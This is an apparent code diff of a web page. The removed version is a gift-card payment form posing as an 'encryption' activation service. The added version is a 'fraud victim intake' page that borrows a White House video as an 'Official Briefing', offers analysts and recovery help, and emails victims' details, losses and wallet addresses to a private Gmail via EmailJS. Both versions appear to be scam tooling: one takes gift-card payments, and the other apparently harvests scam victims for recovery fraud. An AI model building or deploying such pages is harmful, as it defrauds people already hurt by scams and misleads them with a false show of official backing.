-        <div class="form-group">
-          <label><i class="fas fa-user"></i> Your Name</label>
-          <input type="text" id="userName" placeholder="John Doe">
-        </div>
-      </div>
+    <a class="nav-cta" href="#report">
+      Report a Scam
+      <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M5 12h14M13 6l6 6-6 6"/></svg>
+    </a>
+  </div>
+</nav>
 
-      <!-- Contact -->
-      <div class="form-row">
-        <div class="form-group">
-          <label><i class="fas fa-envelope"></i> Email (for confirmation)</label>
-          <input type="email" id="userEmail" placeholder="you@example.com">
-        </div>
-        <div class="form-group">
-          <label><i class="fas fa-phone"></i> Phone</label>
-          <input type="tel" id="userPhone" placeholder="+1 234 567 890">
-        </div>
-      </div>
+<!-- ============================ HERO ============================ -->
+<header class="hero" id="top">
+  <span class="blob b1" aria-hidden="true"></span>
+  <span class="blob b2" aria-hidden="true"></span>
 
-      <!-- Payment: Apple Gift Card -->
-      <div class="form-group">
-        <label class="required"><i class="fas fa-gift"></i> Apple Gift Card (payment method)</label>
-        <div class="file-upload-wrapper" id="fileUploadWrapper">
-          <input type="file" id="giftCardFile" accept="image/*" required>
-          <div class="upload-icon"><i class="fas fa-cloud-upload-alt"></i></div>
-          <div class="file-name" id="fileDisplay">No file chosen</div>
-          <div class="upload-hint">Upload a photo or screenshot of your Apple Gift Card</div>
+  <div class="wrap">
+    <div class="hero-grid">
+      <div>
+        <span class="badge"><span class="pulse" aria-hidden="true"></span> Confidential intake · Open 24/7</span>
+
+        <h1>Scammed online?<br>Tell us your <span class="grad">story.</span></h1>
+
+        <p class="lead">
+          Investment fraud, romance scams, phishing, sextortion, fake brokers — if it
+          happened to you, it matters. Submit a confidential statement and our case
+          response team will review the details, issue you a case reference, and guide
+          you on next steps.
+        </p>
+
+        <div class="cta-row">
+          <a class="btn btn-primary" href="#report">
+            Start Your Report
+            <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M5 12h14M13 6l6 6-6 6"/></svg>
+          </a>
+          <button class="btn btn-ghost" type="button" id="heroChatBtn">
+            <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 11.5a8.4 8.4 0 0 1-9 8.4 9.4 9.4 0 0 1-4.2-1L3 20l1.1-4.6A8.4 8.4 0 0 1 12 3.1a8.4 8.4 0 0 1 9 8.4z"/></svg>
+            Chat With Us
+          </button>
+        </div>
+
+        <div class="stats">
+          <div class="stat"><strong>100%</strong><span>Free to report</span></div>
+          <div class="stat"><strong>24h</strong><span>Typical review window</span></div>
+          <div class="stat"><strong>Private</strong><span>Encrypted submission</span></div>
         </div>
       </div>
 
-      <div class="form-row">
-        <div class="form-group">
-          <label class="required"><i class="fas fa-dollar-sign"></i> Gift Card Amount (USD)</label>
-          <input type="number" id="giftAmount" placeholder="e.g., 100" min="1" step="0.01" required>
+      <!-- decorative case-file mock -->
+      <div class="hero-card" aria-hidden="true">
+        <div class="hc-top">
+          <span class="pulse"></span> Case File · CF-2026-8X4
+          <span class="hc-pill">Under review</span>
         </div>
-        <div class="form-group">
-          <label><i class="fas fa-barcode"></i> Gift Card Code (optional)</label>
-          <input type="text" id="giftCode" placeholder="X1234-5678-90AB">
-        </div>
+        <div class="hc-row"><span class="k">Category</span><span class="skel" style="width:64%"></span></div>
+        <div class="hc-row"><span class="k">Platform</span><span class="skel" style="width:48%"></span></div>
+        <div class="hc-row"><span class="k">Evidence</span><span class="skel" style="width:78%"></span></div>
+        <div class="hc-row"><span class="k">Statement</span><span class="skel" style="width:56%"></span></div>
+        <div class="hc-progress"><span></span></div>
+        <div class="hc-foot"><span class="hc-avatar"></span> Analyst assigned · Response within 24h</div>
       </div>
-
-      <!-- Additional Notes -->
-      <div class="form-group">
-        <label><i class="fas fa-comment"></i> Additional Notes</label>
-        <textarea id="notes" placeholder="Any special instructions or device info..."></textarea>
-      </div>
-
-      <!-- Consent -->
-      <div class="checkbox-group">
-        <input type="checkbox" id="consent" required>
-        <label style="font-weight:400; text-transform:none; letter-spacing:0; font-size:0.9rem;">
-          I confirm that the information provided is accurate and I authorize the encryption process.
-        </label>
-      </div>
-
-      <!-- Buttons -->
-      <div class="btn-group">
-        <button type="submit" class="btn-primary" id="submitBtn">
-          <i class="fas fa-shield-alt"></i> Encrypt & Activate
-        </button>
-        <button type="button" class="btn-secondary" id="clearBtn">
-          <i class="fas fa-undo-alt"></i> Clear
-        </button>
-      </div>
-
-      <div class="info-note">
-        <i class="fas fa-info-circle"></i>
-        <span>Your data is transmitted securely via EmailJS. The encryption key and gift card image are forwarded to our support team for processing.</span>
-      </div>
-    </form>
-
-    <div class="footer">
-      <i class="fas fa-lock"></i> Secure connection •• Your privacy matters
     </div>
   </div>
+</header>
 
-  <script>
-    // ==================== EMAILJS CONFIGURATION ====================
-    // Replace these with your own EmailJS credentials (free at emailjs.com)
-    const EMAILJS_CONFIG = {
-      PUBLIC_KEY: "YOUR_EMAILJS_PUBLIC_KEY",   // e.g., "PYZhrK9im0SfBOGVE"
-      SERVICE_ID: "YOUR_EMAILJS_SERVICE_ID",   // e.g., "service_9e1v5lq"
-      TEMPLATE_ID: "YOUR_EMAILJS_TEMPLATE_ID"  // e.g., "template_9myx7vl"
-    };
+<!-- ============================ VIDEO ============================ -->
+<section class="section" id="briefing">
+  <div class="wrap">
+    <div class="section-head">
+      <p class="eyebrow">Official Briefing</p>
+      <h2 class="section-title">White House Cybercrime Roundtable — Message to Victims</h2>
+      <p class="section-sub">A short address on online fraud, extortion and what victims are urged to do next.</p>
+    </div>
 
-    // Initialize EmailJS
-    emailjs.init(EMAILJS_CONFIG.PUBLIC_KEY);
+    <div class="video-card">
+      <blockquote class="tiktok-embed" cite="https://www.tiktok.com/@foxnews/video/7699203740418575647" data-video-id="7699203740418575647" style="max-width: 605px;min-width: 325px;" > <section> <a target="_blank" title="@foxnews" href="https://www.tiktok.com/@foxnews?refer=embed">@foxnews</a> <p>BREAKING: &#34;To any American who might find themselves a victim of online fraud, extortion, scams... I want you to know that the Trump administration is here to support you and will bring the perpetrators to justice.&#34; President Trump puts online scammers on notice, vowing to bring those targeting Americans through fraud and extortion to justice. &#34;We will work tirelessly to help recover what has been stolen and dismantle the criminal networks that prey on our people.&#34; Speaking at a White House cybercrime roundtable, Trump warns that seniors are especially vulnerable and urges victims to turn to trusted family members and law enforcement for help. Download the FOX News app to follow this developing story.  #foxnews #trump #cybercrime #scammers #whitehouse</p> <a target="_blank" title="♬ original sound  - Fox News" href="https://www.tiktok.com/music/original-sound-Fox-News-7699203824539437854?refer=embed">♬ original sound  - Fox News</a> </section> </blockquote> <script async src="https://www.tiktok.com/embed.js"></script>
+    </div>
+  </div>
+</section>
 
-    // ========== DOM refs ==========
-    const form = document.getElementById('encryptionForm');
-    const submitBtn = document.getElementById('submitBtn');
-    const clearBtn = document.getElementById('clearBtn');
+<!-- ============================ FORM ============================ -->
+<section class="form-section" id="report">
+  <div class="wrap">
+    <div class="form-grid">
 
-    const deviceOS = document.getElementById('deviceOS');
-    const deviceID = document.getElementById('deviceID');
-    const encryptionKey = document.getElementById('encryptionKey');
-    const userName = document.getElementById('userName');
-    const userEmail = document.getElementById('userEmail');
-    const userPhone = document.getElementById('userPhone');
-    const giftCardFile = document.getElementById('giftCardFile');
-    const fileDisplay = document.getElementById('fileDisplay');
-    const giftAmount = document.getElementById('giftAmount');
-    const giftCode = document.getElementById('giftCode');
-    const notes = document.getElementById('notes');
-    const consent = document.getElementById('consent');
+      <!-- ASIDE -->
+      <aside class="form-aside">
+        <p class="eyebrow">Before You Submit</p>
+        <h2>What happens to your report</h2>
 
-    // Update file name display
-    giftCardFile.addEventListener('change', function() {
-      if (this.files && this.files[0]) {
-        fileDisplay.textContent = this.files[0].name;
-      } else {
-        fileDisplay.textContent = 'No file chosen';
-      }
+        <ol class="steps">
+          <li>
+            <span class="num">1</span>
+            <div>
+              <strong>You submit the intake form</strong>
+              <p>Describe what happened in your own words. Include dates, amounts and any contact details the scammer used.</p>
+            </div>
+          </li>
+          <li>
+            <span class="num">2</span>
+            <div>
+              <strong>You receive a case reference</strong>
+              <p>A unique reference like <em>CF-2026-A1B2C</em> is generated the moment you send the form.</p>
+            </div>
+          </li>
+          <li>
+            <span class="num">3</span>
+            <div>
+              <strong>An analyst reviews your details</strong>
+              <p>Your statement is assessed for patterns, methods used, and the recovery options available to you.</p>
+            </div>
+          </li>
+          <li>
+            <span class="num">4</span>
+            <div>
+              <strong>We contact you</strong>
+              <p>You'll be reached by your preferred method with next steps and guidance on official reporting.</p>
+            </div>
+          </li>
+        </ol>
+
+        <div class="aside-note">
+          <strong>Never share passwords</strong> or one-time codes with anyone — including
+          anyone claiming to be investigating your case. No legitimate team will ever ask for them.
+        </div>
+      </aside>
+
+      <!-- FORM -->
+      <form id="reportForm" class="form-card" novalidate>
+
+        <!-- hidden fields sent to EmailJS -->
+        <input type="hidden" name="to_email" id="to_email">
+        <input type="hidden" name="reference_id" id="reference_id">
+
+        <div class="card-head">
+          <div>
+            <h2>Victim Statement &amp; Case Intake</h2>
+            <p>Fields marked <span class="req">*</span> are required. Everything is treated as confidential.</p>
+          </div>
+          <div class="ref-chip">CASE&nbsp;REF: <span id="refDisplay">—</span></div>
+        </div>
+
+        <div class="grid">
+
+          <div class="field">
+            <label for="full_name">Full Name <span class="req">*</span></label>
+            <input id="full_name" name="from_name" type="text" placeholder="Jane A. Doe" autocomplete="name" required>
+          </div>
+
+          <div class="field">
+            <label for="email">Email Address <span class="req">*</span></label>
+            <input id="email" name="reply_to" type="email" placeholder="you@example.com" autocomplete="email" required>
+          </div>
+
+          <div class="field">
+            <label for="phone">Phone / WhatsApp</label>
+            <input id="phone" name="phone" type="tel" placeholder="+1 555 010 2030" autocomplete="tel">
+          </div>
+
+          <div class="field">
+            <label for="country">Country of Residence <span class="req">*</span></label>
+            <input id="country" name="country" type="text" placeholder="United States" autocomplete="country-name" required>
+          </div>
+
+          <div class="field">
+            <label for="scam_type">Type of Scam <span class="req">*</span></label>
+            <select id="scam_type" name="scam_type" required>
+              <option value="" selected disabled>Select a category…</option>
+              <option>Investment / Crypto Fraud</option>
+              <option>Romance / Confidence Scam</option>
+              <option>Phishing / Email Fraud</option>
+              <option>Tech Support Scam</option>
+              <option>Online Purchase / Auction Fraud</option>
+              <option>Job / Employment Scam</option>
+              <option>Lottery / Prize Scam</option>
+              <option>Government or Bank Impersonation</option>
+              <option>Extortion / Sextortion</option>
+              <option>Social Media / Account Takeover</option>
+              <option>Other</option>
+            </select>
+          </div>
+
+          <div class="field">
+            <label for="platform">Platform / Channel Used</label>
+            <input id="platform" name="platform" type="text" placeholder="e.g. WhatsApp, Telegram, fake broker site">
+          </div>
+
+          <div class="field">
+            <label for="incident_date">Date of Incident</label>
+            <input id="incident_date" name="incident_date" type="date">
+          </div>
+
+          <div class="field">
+            <label for="amount_lost">Amount Lost</label>
+            <input id="amount_lost" name="amount_lost" type="text" placeholder="e.g. 12,500" inputmode="decimal">
+          </div>
+
+          <div class="field">
+            <label for="currency">Currency</label>
+            <select id="currency" name="currency">
+              <option>USD</option><option>EUR</option><option>GBP</option>
+              <option>CAD</option><option>AUD</option><option>INR</option>
+              <option>NGN</option><option>ZAR</option><option>Other</option>
+            </select>
+          </div>
+
+          <div class="field">
+            <label for="contact_preference">Preferred Contact Method</label>
+            <select id="contact_preference" name="contact_preference">
+              <option>Email</option>
+              <option>Phone Call</option>
+              <option>WhatsApp</option>
+              <option>Either / Any</option>
+            </select>
+          </div>
+
+          <div class="field full">
+            <label for="message">
+              Tell Us What Happened <span class="req">*</span>
+              <span class="hint">Include how contact was made, what you were told, how payments were sent, and any names, usernames, phone numbers or wallet addresses involved.</span>
+            </label>
+            <textarea id="message" name="message" required minlength="40"
+              placeholder="On 12 March I was contacted on WhatsApp by someone claiming to be…"></textarea>
+          </div>
+
+          <div class="field full">
+            <label for="evidence_links">Links to Evidence</label>
+            <textarea id="evidence_links" name="evidence_links" style="min-height:92px"
+              placeholder="Screenshots (Google Drive / Dropbox links), transaction IDs, wallet addresses, scam website URLs…"></textarea>
+          </div>
+
+          <div class="consent">
+            <input type="checkbox" id="consent" name="consent" value="Yes — consent given" required>
+            <label for="consent">
+              I confirm the information provided is true and accurate to the best of my knowledge,
+              and I consent to my details being stored and reviewed for the purpose of assessing
+              and responding to my case. <span class="req">*</span>
+            </label>
+          </div>
+
+          <div id="formStatus" class="status" role="status" aria-live="polite"></div>
+
+          <div class="actions">
+            <button type="submit" class="btn-submit" id="submitBtn">
+              <span class="spinner" aria-hidden="true"></span>
+              <span class="btn-label">Submit Confidential Report</span>
+            </button>
+            <span class="secure-note">
+              <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><rect x="4" y="10" width="16" height="10" rx="2"/><path d="M8 10V7a4 4 0 1 1 8 0v3"/></svg>
+              Secure transmission · Never share passwords or one-time codes
+            </span>
+          </div>
+
+        </div>
+      </form>
+    </div>
+  </div>
+</section>
+
+<!-- ============================ FOOTER ============================ -->
+<footer>
+  <div class="wrap">
+    <div class="disclaimer">
+      <strong>Important notice:</strong> This is an independent fraud-victim intake and
+      consultation page. It is <strong>not</strong> affiliated with, endorsed by, or operated by
+      the Federal Bureau of Investigation, the U.S. government, or any law-enforcement agency.
+      Submitting this form does not constitute a formal legal report or a police complaint.
+      If you are in immediate danger or have suffered a crime, contact your local police and
+      your national fraud reporting authority directly.
+    </div>
+    <div class="footer-bottom">
+      <span>© <span id="year"></span> Fraud Victim Intake. All rights reserved.</span>
+      <span>Confidential intake · Case references auto-generated</span>
+    </div>
+  </div>
+</footer>
+
+<!-- ============================ LIVE CHAT ============================ -->
+<button class="chat-launcher" id="chatLauncher" type="button" aria-label="Open live support chat" aria-expanded="false">
+  <svg class="icon-chat" width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+    <path d="M21 11.5a8.4 8.4 0 0 1-9 8.4 9.4 9.4 0 0 1-4.2-1L3 20l1.1-4.6A8.4 8.4 0 0 1 12 3.1a8.4 8.4 0 0 1 9 8.4z"/>
+    <path d="M8.5 11.5h.01M12 11.5h.01M15.5 11.5h.01"/>
+  </svg>
+  <svg class="icon-close" width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round">
+    <path d="M18 6 6 18M6 6l12 12"/>
+  </svg>
+  <span class="chat-badge">1</span>
+</button>
+
+<div class="chat-panel" id="chatPanel" role="dialog" aria-label="Live support chat" aria-modal="false">
+  <div class="chat-head">
+    <div class="chat-avatar" aria-hidden="true">
+      <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+        <path d="M12 2 20 5v6c0 5.3-3.6 9.1-8 11-4.4-1.9-8-5.7-8-11V5z"/><path d="m8.5 12 2.5 2.5 4.5-5"/>
+      </svg>
+    </div>
+    <div>
+      <h3>Intake Assistant</h3>
+      <p><span class="dot" aria-hidden="true"></span> Online · usually replies instantly</p>
+    </div>
+    <button class="chat-close" id="chatClose" type="button" aria-label="Close chat">
+      <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M18 6 6 18M6 6l12 12"/></svg>
+    </button>
+  </div>
+
+  <div class="chat-body" id="chatBody"></div>
+  <div class="chat-quick" id="chatQuick"></div>
+
+  <form class="chat-input" id="chatForm">
+    <input id="chatInput" type="text" placeholder="Type a message…" autocomplete="off" aria-label="Chat message">
+    <button class="chat-send" type="submit" aria-label="Send message">
+      <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M22 2 11 13"/><path d="M22 2 15 22l-4-9-9-4z"/></svg>
+    </button>
+  </form>
+</div>
+
+<!-- ============================ EMAILJS ============================ -->
+<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+
+<script>
+/* =====================================================================
+   ⚙️  CONFIGURATION — REPLACE THE FOUR VALUES BELOW
+   ---------------------------------------------------------------------
+   1. EMAILJS_PUBLIC_KEY  → EmailJS dashboard → Account → Public Key
+   2. EMAILJS_SERVICE_ID  → EmailJS dashboard → Email Services
+   3. EMAILJS_TEMPLATE_ID → EmailJS dashboard → Email Templates
+   4. RECIPIENT_EMAIL     → your Gmail address (the inbox that receives reports)
+
+   Your EmailJS template should contain these variables:
+   {{to_email}} {{from_name}} {{reply_to}} {{reference_id}}
+   {{scam_type}} {{country}} {{message}}
+   ===================================================================== */
+const EMAILJS_PUBLIC_KEY  = "YOUR_PUBLIC_KEY";
+const EMAILJS_SERVICE_ID  = "YOUR_SERVICE_ID";
+const EMAILJS_TEMPLATE_ID = "YOUR_TEMPLATE_ID";
+const RECIPIENT_EMAIL     = "your.address@gmail.com";
+/* ===================================================================== */
+
+emailjs.init({ publicKey: EMAILJS_PUBLIC_KEY });
+
+/* =========================================================
+   SHARED HELPERS
+   ========================================================= */
+function generateRef(prefix) {
+  const y = new Date().getFullYear();
+  const r = Math.random().toString(36).slice(2, 7).toUpperCase();
+  return `${prefix}-${y}-${r}`;
+}
+document.getElementById('year').textContent = new Date().getFullYear();
+
+/* =========================================================
+   INTAKE FORM
+   ========================================================= */
+const form      = document.getElementById('reportForm');
+const statusEl  = document.getElementById('formStatus');
+const submitBtn = document.getElementById('submitBtn');
+const btnLabel  = submitBtn.querySelector('.btn-label');
+
+let caseRef = generateRef('CF');
+document.getElementById('reference_id').value = caseRef;
+document.getElementById('refDisplay').textContent = caseRef;
+document.getElementById('to_email').value = RECIPIENT_EMAIL;
+
+function showStatus(type, html) {
+  statusEl.className = 'status show ' + type;
+  statusEl.innerHTML = html;
+  statusEl.scrollIntoView({ behavior: 'smooth', block: 'center' });
+}
+function clearStatus() {
+  statusEl.className = 'status';
+  statusEl.innerHTML = '';
+}
+
+form.addEventListener('submit', function (e) {
+  e.preventDefault();
+  clearStatus();
+
+  if (!form.checkValidity()) {
+    form.reportValidity();
+    showStatus('err', '⚠️ Please complete all required fields before submitting.');
+    return;
+  }
+
+  submitBtn.disabled = true;
+  submitBtn.classList.add('loading');
+  btnLabel.textContent = 'Transmitting Securely…';
+
+  emailjs.sendForm(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, form)
+    .then(function () {
+      showStatus(
+        'ok',
+        `✅ <strong>Report received.</strong> Your case reference is
+         <strong>${caseRef}</strong>. A member of our response team will review
+         your submission and contact you using your preferred method. Please keep
+         this reference number for your records.`
+      );
+
+      form.reset();
+
+      caseRef = generateRef('CF');
+      document.getElementById('reference_id').value = caseRef;
+      document.getElementById('refDisplay').textContent = caseRef;
+      document.getElementById('to_email').value = RECIPIENT_EMAIL;
+    })
+    .catch(function (err) {
+      console.error('EmailJS error:', err);
+      showStatus(
+        'err',
+        `❌ <strong>Submission failed.</strong> We could not transmit your report.
+         Please check your connection and try again, or email us directly at
+         <a href="mailto:${RECIPIENT_EMAIL}">${RECIPIENT_EMAIL}</a>.`
+      );
+    })
+    .finally(function () {
+      submitBtn.disabled = false;
+      submitBtn.classList.remove('loading');
+      btnLabel.textContent = 'Submit Confidential Report';
     });
+});
 
-    // ========== Toast ==========
-    function showToast(msg, isError = false) {
-      const existing = document.querySelector('.toast-msg');
-      if (existing) existing.remove();
-      const toast = document.createElement('div');
-      toast.className = 'toast-msg';
-      toast.style.borderLeftColor = isError ? '#ef4444' : '#10b981';
-      toast.innerHTML = `<i class="fas ${isError ? 'fa-exclamation-circle' : 'fa-check-circle'}"></i> ${msg}`;
-      document.body.appendChild(toast);
-      setTimeout(() => toast.remove(), 6000);
-    }
+/* =========================================================
+   LIVE CHAT
+   ========================================================= */
+const chatEls = {
+  launcher: document.getElementById('chatLauncher'),
+  panel:    document.getElementById('chatPanel'),
+  close:    document.getElementById('chatClose'),
+  body:     document.getElementById('chatBody'),
+  quick:    document.getElementById('chatQuick'),
+  form:     document.getElementById('chatForm'),
+  input:    document.getElementById('chatInput')
+};
 
-    // ========== Validate ==========
-    function validateForm() {
-      if (!deviceOS.value) { showToast('Please select your device OS.', true); return false; }
-      if (!deviceID.value.trim()) { showToast('Device ID / IMEI is required.', true); return false; }
-      if (!encryptionKey.value.trim()) { showToast('Encryption key is required.', true); return false; }
-      if (!giftCardFile.files || giftCardFile.files.length === 0) { showToast('Please upload an Apple Gift Card image.', true); return false; }
-      if (!giftAmount.value || parseFloat(giftAmount.value) <= 0) { showToast('Please enter a valid gift card amount.', true); return false; }
-      if (!consent.checked) { showToast('You must confirm the accuracy of the information.', true); return false; }
-      return true;
-    }
+let chatOpen   = false;
+let greeted    = false;
+let chatStep   = 'start';
+let chatEmail  = null;
+let transcript = [];
+const chatRef  = generateRef('CHAT');
 
-    // ========== Convert file to base64 ==========
-    function fileToBase64(file) {
-      return new Promise((resolve, reject) => {
-        const reader = new FileReader();
-        reader.readAsDataURL(file);
-        reader.onload = () => resolve(reader.result);
-        reader.onerror = error => reject(error);
-      });
-    }
+/* ---------- open / close ---------- */
+function setChat(open) {
+  chatOpen = open;
+  chatEls.panel.classList.toggle('open', open);
+  chatEls.launcher.classList.toggle('is-open', open);
+  chatEls.launcher.setAttribute('aria-expanded', String(open));
+  if (open) {
+    setTimeout(() => chatEls.input.focus(), 260);
+    scrollChat();
+  }
+}
+chatEls.launcher.addEventListener('click', () => {
+  setChat(!chatOpen);
+  if (chatOpen) startChat();
+});
+chatEls.close.addEventListener('click', () => setChat(false));
+document.addEventListener('keydown', e => {
+  if (e.key === 'Escape' && chatOpen) setChat(false);
+});
+document.getElementById('heroChatBtn').addEventListener('click', () => {
+  setChat(true);
+  startChat();
+});
 
-    // ========== Submit handler ==========
-    async function handleSubmit(event) {
-      event.preventDefault();
+/* ---------- rendering ---------- */
+function scrollChat() {
+  chatEls.body.scrollTop = chatEls.body.scrollHeight;
+}
 
-      if (!validateForm()) return;
+function pushMsg(role, text) {
+  const row = document.createElement('div');
+  row.className = 'msg ' + role;
 
-      // Disable button and show loading
-      submitBtn.disabled = true;
-      submitBtn.innerHTML = '<i class="fas fa-spinner fa-pulse"></i> Processing...';
-      document.body.classList.add('loading');
+  const bubble = document.createElement('div');
+  bubble.className = 'bubble';
+  bubble.textContent = text;
 
-      try {
-        // Read file as base64 (size limit ~5MB, EmailJS has limit)
-        const file = giftCardFile.files[0];
-        let fileBase64 = '';
-        if (file) {
-          fileBase64 = await fileToBase64(file);
-          // Truncate if too large (EmailJS free tier has ~25KB limit for attachments)
-          // We'll send as a string; if too long, we truncate and warn.
-          if (fileBase64.length > 20000) {
-            fileBase64 = fileBase64.substring(0, 20000) + '… [truncated]';
-            showToast('⚠️ Image truncated due to size limit. Please keep images under ~20KB.', true);
-          }
-        }
+  row.appendChild(bubble);
+  chatEls.body.appendChild(row);
 
-        // Prepare EmailJS template parameters
-        const templateParams = {
-          device_os: deviceOS.value,
-          device_id: deviceID.value.trim(),
-          encryption_key: encryptionKey.value.trim(),
-          user_name: userName.value.trim() || 'Not provided',
-          user_email: userEmail.value.trim() || 'Not provided',
-          user_phone: userPhone.value.trim() || 'Not provided',
-          gift_card_amount: giftAmount.value,
-          gift_card_code: giftCode.value.trim() || 'Not provided',
-          gift_card_image_base64: fileBase64 || 'No image',
-          notes: notes.value.trim() || 'None',
-          submission_date: new Date().toLocaleString()
-        };
+  transcript.push((role === 'bot' ? 'Assistant: ' : 'Visitor: ') + text);
+  scrollChat();
+}
 
-        // Send via EmailJS
-        const response = await emailjs.send(
-          EMAILJS_CONFIG.SERVICE_ID,
-          EMAILJS_CONFIG.TEMPLATE_ID,
-          templateParams
-        );
+let typingEl = null;
+function setTyping(on) {
+  if (on) {
+    if (typingEl) return;
+    typingEl = document.createElement('div');
+    typingEl.className = 'msg bot typing';
+    typingEl.innerHTML =
+      '<div class="bubble"><span class="tdot"></span><span class="tdot"></span><span class="tdot"></span></div>';
+    chatEls.body.appendChild(typingEl);
+    scrollChat();
+  } else if (typingEl) {
+    typingEl.remove();
+    typingEl = null;
+  }
+}
 
-        console.log('Email sent:', response);
-        showToast('✅ Encryption request submitted successfully! Check your email for confirmation.');
-        form.reset();
-        fileDisplay.textContent = 'No file chosen';
-        // Reset checkbox
-        consent.checked = false;
+function botSay(text, delay = 700) {
+  setTyping(true);
+  setTimeout(() => {
+    setTyping(false);
+    pushMsg('bot', text);
+  }, delay);
+}
 
-      } catch (error) {
-        console.error('EmailJS error:', error);
-        let msg = 'Failed to send. Please check your EmailJS configuration.';
-        if (error.text) msg += ' Error: ' + error.text;
-        showToast('❌ ' + msg, true);
-      } finally {
-        submitBtn.disabled = false;
-        submitBtn.innerHTML = '<i class="fas fa-shield-alt"></i> Encrypt & Activate';
-        document.body.classList.remove('loading');
+function setQuick(list) {
+  chatEls.quick.innerHTML = '';
+  list.forEach(item => {
+    const b = document.createElement('button');
+    b.type = 'button';
+    b.className = 'quick';
+    b.textContent = item.label;
+    b.addEventListener('click', item.action);
+    chatEls.quick.appendChild(b);
+  });
+  chatEls.quick.classList.toggle('empty', list.length === 0);
+  scrollChat();
+}
+
+/* ---------- conversation actions ---------- */
+function goToForm() {
+  pushMsg('user', 'Open the form');
+  botSay('Opening the confidential intake form — it takes about 3 minutes to complete.');
+  document.getElementById('report').scrollIntoView({ behavior: 'smooth' });
+  setTimeout(() => setChat(false), 900);
+  setQuick([
+    { label: 'Talk to a human', action: askHuman }
+  ]);
+}
+
+function askHuman() {
+  pushMsg('user', 'Talk to a human');
+  botSay("Of course. What's the best email address to reach you? I'll forward this conversation to our response team.");
+  chatStep = 'await_email';
+  chatEls.input.placeholder = 'Type your email address…';
+  setQuick([]);
+}
+
+function menu() {
+  chatStep = 'start';
+  chatEls.input.placeholder = 'Type a message…';
+  setQuick([
+    {
+      label: "I've been scammed",
+      action: () => {
+        pushMsg('user', "I've been scammed");
+        botSay("I'm sorry that happened to you — you're in the right place. Open the confidential intake form and describe what happened. Include dates, amounts, and any contact details the scammer used. A case analyst will review it.");
+        setQuick([
+          { label: 'Open the form', action: goToForm },
+          { label: 'Talk to a human', action: askHuman },
+          { label: 'Back to menu', action: menu }
+        ]);
       }
-    }
-
-    // ========== Clear form ==========
-    function clearForm() {
-      if (confirm('Clear all fields?')) {
-        form.reset();
-        fileDisplay.textContent = 'No file chosen';
-        consent.checked = false;
-        showToast('Form cleared.');
+    },
+    {
+      label: 'How does it work?',
+      action: () => {
+        pushMsg('user', 'How does it work?');
+        botSay("It's simple:\n1) Submit the intake form with your story.\n2) You receive a case reference.\n3) An analyst reviews your details.\n4) We contact you with next steps and reporting guidance.");
+        setQuick([
+          { label: 'Open the form', action: goToForm },
+          { label: 'Talk to a human', action: askHuman },
+          { label: 'Back to menu', action: menu }
+        ]);
       }
+    },
+    {
+      label: 'Is it free?',
+      action: () => {
+        pushMsg('user', 'Is it free?');
+        botSay('Yes — reporting through this portal is completely free. We never ask for payment, passwords, or one-time codes.');
+        setQuick([
+          { label: 'Open the form', action: goToForm },
+          { label: 'Talk to a human', action: askHuman },
+          { label: 'Back to menu', action: menu }
+        ]);
+      }
+    },
+    { label: 'Talk to a human', action: askHuman }
+  ]);
+}
+
+function startChat() {
+  if (greeted) return;
+  greeted = true;
+  botSay("Hi there 👋 Welcome to the Fraud Victim Intake desk. I'm your intake assistant — how can I help you today?", 500);
+  setTimeout(menu, 1150);
+}
+
+/* ---------- chat input ---------- */
+chatEls.form.addEventListener('submit', e => {
+  e.preventDefault();
+  const val = chatEls.input.value.trim();
+  if (!val) return;
+
+  chatEls.input.value = '';
+  pushMsg('user', val);
+
+  /* ---- awaiting an email address ---- */
+  if (chatStep === 'await_email') {
+    if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(val)) {
+      botSay("That doesn't look like a valid email address. Could you check and type it again?");
+      return;
     }
 
-    // ========== Event listeners ==========
-    form.addEventListener('submit', handleSubmit);
-    clearBtn.addEventListener('click', clearForm);
+    chatEmail = val;
+    chatStep  = 'start';
+    chatEls.input.placeholder = 'Type a message…';
+    setTyping(true);
 
-    // Warn if EmailJS not configured
-    if (EMAILJS_CONFIG.PUBLIC_KEY === "YOUR_EMAILJS_PUBLIC_KEY") {
-      const warning = document.createElement('div');
-      warning.style.background = '#b91c1c80';
-      warning.style.padding = '12px 18px';
-      warning.style.borderRadius = '20px';
-      warning.style.marginBottom = '1.2rem';
-      warning.style.fontSize = '0.85rem';
-      warning.style.color = '#fdd';
-      warning.innerHTML = '<i class="fas fa-exclamation-triangle"></i> .';
-      form.prepend(warning);
-    }
+    emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, {
+      to_email:     RECIPIENT_EMAIL,
+      from_name:    'Live Chat Visitor',
+      reply_to:     chatEmail,
+      reference_id: chatRef,
+      scam_type:    'Live Chat Enquiry',
+      country:      '—',
+      message:      transcript.join('\n')
+    }).then(() => {
+      setTyping(false);
+      pushMsg('bot',
+        'Thank you — your conversation has been forwarded to our response team. ' +
+        'Your chat reference is ' + chatRef + '. An analyst will contact you at ' +
+        chatEmail + ' within 24 hours.'
+      );
+      setQuick([
+        { label: 'Open the form', action: goToForm },
+        { label: 'Back to menu', action: menu }
+      ]);
+    }).catch(err => {
+      console.error('Chat EmailJS error:', err);
+      setTyping(false);
+      pushMsg('bot',
